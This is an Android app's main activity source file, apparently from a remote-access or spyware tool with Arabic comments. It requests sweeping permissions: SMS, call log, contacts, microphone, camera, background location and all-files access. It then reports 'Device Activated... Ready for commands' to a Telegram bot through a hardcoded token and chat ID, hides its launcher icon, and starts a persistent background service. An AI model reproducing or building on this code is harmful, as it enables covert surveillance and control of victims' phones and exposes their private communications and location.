package com.alzahra;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import com.alzahra.services.CoreService;
import com.alzahra.telegram.TelegramBot;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int REQ_CODE = 1001;
    private final Handler handler = new Handler(Looper.getMainLooper());
    
    // قائمة الأذونات التي تحتاج طلب
    private final List<String> permissionsToRequest = new ArrayList<>();
    private int currentPermissionIndex = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate called");
        
        if (getSharedPreferences("config", MODE_PRIVATE).getBoolean("configured", false)) {
            finish();
            return;
        }
        
        // بدء سلسلة الأذونات
        requestNextPermission();
    }
    
    private void requestNextPermission() {
        permissionsToRequest.clear();
        
        // 1. أذونات الملفات (خاصة لأندرويد 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, 2001);
                return; // ننتظر النتيجة
            }
        }
        
        // 2. الظهور فوق التطبيقات
        if (!Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, 2002);
            return;
        }
        
        // 3. تجاهل تحسينات البطارية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + getPackageName()));
            try {
                startActivityForResult(intent, 2003);
                return;
            } catch (Exception e) {
                Log.e(TAG, "Battery optimization intent failed", e);
            }
        }
        
        // 4. الأذونات العادية
        addRegularPermissions();
        
        if (!permissionsToRequest.isEmpty()) {
            String[] array = permissionsToRequest.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, array, REQ_CODE);
        } else {
            onAllPermissionsGranted();
        }
    }
    
    private void addRegularPermissions() {
        // تخزين
        permissionsToRequest.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        permissionsToRequest.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
        
        // اتصالات
        permissionsToRequest.add(android.Manifest.permission.READ_SMS);
        permissionsToRequest.add(android.Manifest.permission.SEND_SMS);
        permissionsToRequest.add(android.Manifest.permission.READ_CALL_LOG);
        permissionsToRequest.add(android.Manifest.permission.READ_CONTACTS);
        permissionsToRequest.add(android.Manifest.permission.READ_PHONE_STATE);
        
        // تسجيل
        permissionsToRequest.add(android.Manifest.permission.RECORD_AUDIO);
        
        // موقع
        permissionsToRequest.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        permissionsToRequest.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        
        // كاميرا
        permissionsToRequest.add(android.Manifest.permission.CAMERA);
        
        // إشعارات (أندرويد 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToRequest.add(android.Manifest.permission.POST_NOTIFICATIONS);
            permissionsToRequest.add(android.Manifest.permission.READ_MEDIA_IMAGES);
            permissionsToRequest.add(android.Manifest.permission.READ_MEDIA_VIDEO);
            permissionsToRequest.add(android.Manifest.permission.READ_MEDIA_AUDIO);
        }
        
        // موقع خلفي (أندرويد 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionsToRequest.add(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.d(TAG, "onActivityResult: " + requestCode);
        
        // Whatever the result, continue to next permission
        requestNextPermission();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Log.d(TAG, "onRequestPermissionsResult: " + requestCode);
        
        // Even if some denied, continue (we'll handle missing permissions later)
        onAllPermissionsGranted();
    }

    private void onAllPermissionsGranted() {
        Log.d(TAG, "All permissions processed");
        
        // إرسال رسالة للبوت
        sendActivationToBot();
        
        // إخفاء بعد 5 ثواني
        handler.postDelayed(this::hideFromLauncher, 5000);
        
        // بدء الخدمة
        Intent serviceIntent = new Intent(this, CoreService.class);
        ContextCompat.startForegroundService(this, serviceIntent);
        
        // حفظ الحالة
        getSharedPreferences("config", MODE_PRIVATE)
                .edit().putBoolean("configured", true).apply();
        
        // إغلاق النشاط بعد تأخير بسيط
        handler.postDelayed(this::finish, 2000);
    }
    
    private void sendActivationToBot() {
        new Thread(() -> {
            try {
                // انتظار الاتصال بالإنترنت
                for (int i = 0; i < 15; i++) {
                    if (isNetworkAvailable()) break;
                    Thread.sleep(2000);
                }
                
                TelegramBot bot = new TelegramBot("8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA");
                
                String message = "📱 <b>Device Activated</b>\n\n" +
                        "📱 Model: " + Build.MODEL + "\n" +
                        "🏭 Manufacturer: " + Build.MANUFACTURER + "\n" +
                        "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
                        "⏰ Time: " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new java.util.Date()) + "\n\n" +
                        "✅ Ready for commands";
                
                boolean sent = bot.sendMessage("7344776596", message);
                Log.d(TAG, "Activation message sent: " + sent);
                
            } catch (Exception e) {
                Log.e(TAG, "Failed to send activation", e);
            }
        }).start();
    }
    
    private boolean isNetworkAvailable() {
        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        if (cm == null) return false;
        android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnected();
    }

    private void hideFromLauncher() {
        try {
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            getPackageManager().setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
            Log.d(TAG, "Hidden from launcher");
        } catch (Exception e) {
            Log.e(TAG, "Hide failed", e);
        }
    }
}
